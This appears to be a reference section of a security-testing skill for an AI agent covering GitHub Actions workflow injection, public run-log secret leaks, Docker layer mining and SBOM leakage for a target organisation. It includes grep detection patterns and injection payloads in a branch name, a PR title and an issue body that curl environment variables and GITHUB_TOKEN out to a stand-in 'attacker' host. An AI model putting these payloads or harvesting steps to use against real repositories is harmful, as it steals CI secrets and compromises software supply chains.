# GitHub Actions / Docker / SBOM

> Reference content for the `supply-chain-attack-recon` skill. Originally Steps 6–8 of the monolithic SKILL.md (refactored 2026-11-18 for size/load efficiency).

## Step 6 — GitHub Actions workflow injection scan

For each public repo with `.github/workflows/`:

```bash
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  workflows=$(gh api "repos/$ORG/$repo/contents/.github/workflows" --jq '.[].name' 2>/dev/null)
  for wf in $workflows; do
    content=$(gh api "repos/$ORG/$repo/contents/.github/workflows/$wf" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
    echo "=== $repo/$wf ==="
    
    # High-risk patterns:
    # 1. pull_request_target (runs with secrets on PR from forks)
    echo "$content" | grep -E 'pull_request_target'
    
    # 2. Untrusted context interpolation
    echo "$content" | grep -E '\$\{\{[^}]*github\.(event|head_ref|pull_request)[^}]*\}\}'
    
    # 3. ${{ github.event.* }} into shell run blocks
    echo "$content" | grep -B1 -A2 'run:' | grep -E '\$\{\{ ?github\.event\.'
    
    # 4. checkout of PR head with elevated perms
    echo "$content" | grep -E 'ref:.*pull_request|head_ref'
    
    # 5. Self-hosted runner without isolation
    echo "$content" | grep -E 'runs-on:.*self-hosted'

    # 6. Unpinned third-party actions — mutable tag (@v1, @main) vs pinned (@<40-char sha>)
    #    Mutable tags can be repointed by a compromised action repo (see case #9, tj-actions/changed-files).
    echo "$content" | grep -E 'uses: *[^ ]+/[^ ]+@(v?[0-9]+([.][0-9]+)*|main|master|latest)\b' | grep -v '@[0-9a-f]\{40\}'
  done
done
```

### Injection patterns to flag (severity guide)

| Pattern | Severity |
|---|---|
| `pull_request_target` + `actions/checkout` with `ref: pull_request.head.sha` + uses repo secrets | **Critical** — RCE on runner with org secrets |
| `${{ github.event.pull_request.title }}` interpolated into shell | **Critical** — script injection via PR title |
| Third-party action pinned to a mutable tag (`uses: org/repo@v1` / `@main`) instead of a commit SHA | **High** — repointable supply-chain vector (see case #9) |
| Self-hosted runner reachable from public repo workflows | **High** — persistent attacker pivot |
| Issue-comment-triggered workflow that runs `gh` with token | **High** |
| Workflow downloads from URL that target controls | **Medium** |

### GitHub Actions context injection sinks (branch name, PR title, issue body)

Untrusted context flowing from PR metadata into `run:` blocks is a classic injection vector. Test payloads:

```bash
# Malicious branch name (test in a fork PR):
git checkout -b 'feat/x"; curl https://attacker/?d=$(env | base64);"'
git push origin 'feat/x"; curl https://attacker/?d=$(env | base64);"'

# Malicious PR title (create a test PR with this title):
PR_TITLE='x"; curl https://attacker/?d=$(echo $GITHUB_TOKEN | base64);"'

# Malicious issue body:
ISSUE_BODY='x"; curl https://attacker/?leak=$(git config user.name);"'

# Then watch workflow logs. If the injected commands execute, secrets are exfil'd.
```

### Public GitHub Actions run logs (leaks secrets)

Actions logs are public by default on public repos. Look for:

```bash
# List all Action runs for a repo
gh api repos/OWNER/REPO/actions/runs --jq '.workflow_runs[] | {id, name, head_branch, status, conclusion}'

# Fetch logs from a run
gh api repos/OWNER/REPO/actions/runs/<id>/logs --jq '.logs' | base64 -d

# Search logs for common leakage patterns
gh api repos/OWNER/REPO/actions/runs/<id>/logs | grep -iE 'token|key|secret|password|credential|aws_'
```

Leaked secrets in logs = direct credential exfil; severity depends on the token type (GitHub PAT, npm token, AWS key, etc.).

### Static detection of Actions injection sinks with zizmor

For high-confidence automated flagging, run the `zizmor` analyzer on all workflow files:

```bash
# Install zizmor (Rust-based, from https://github.com/woodruffw/zizmor)
cargo install zizmor

# Scan all workflows
zizmor .github/workflows/*.yml

# Output includes: pull_request_target, mutable-tag uses, context interpolation, etc.
# Sort findings by risk tier
```

Zizmor saves manual regex work and catches edge cases (e.g., indirect context interpolation via variable references).

---

## Step 7 — Docker / container image registry mining

```bash
# Docker Hub
curl -s "https://hub.docker.com/v2/repositories/$ORG/?page_size=100" | jq -r '.results[].name'

# GHCR (GitHub Container Registry) — public images visible in repo packages tab
gh api "users/$ORG/packages?package_type=container" 2>/dev/null
gh api "orgs/$ORG/packages?package_type=container" 2>/dev/null

# For each image, list tags
for img in image1 image2; do
  curl -s "https://hub.docker.com/v2/repositories/$ORG/$img/tags?page_size=20" | jq -r '.results[].name'
done

# Pull and inspect layers
docker pull "$ORG/$img:latest"
docker history --no-trunc "$ORG/$img:latest"

# Mine layers for secrets
docker save "$ORG/$img:latest" -o /tmp/image.tar
mkdir -p /tmp/img && tar -xf /tmp/image.tar -C /tmp/img
find /tmp/img -name "*.tar*" -exec tar -xf {} -C /tmp/img/extracted \;
# Then run gitleaks / trufflehog over extracted filesystem
trufflehog filesystem /tmp/img/extracted --no-update
```

---

## Step 8 — SBOM / artifact metadata leakage

```bash
# Look for SBOMs published as releases (SPDX, CycloneDX format)
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("sbom|cyclonedx|spdx"; "i")) | .browser_download_url'

# JSON dependency lockfiles in releases
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("lock|deps"; "i")) | .browser_download_url'

# Exact-version-pinned deps → known-CVE chaining
# Compare versions to nuclei nvd templates or osv.dev for known vulns
curl -s "https://api.osv.dev/v1/query" -d '{"package": {"name": "lodash", "ecosystem": "npm"}, "version": "4.17.10"}'
```

---
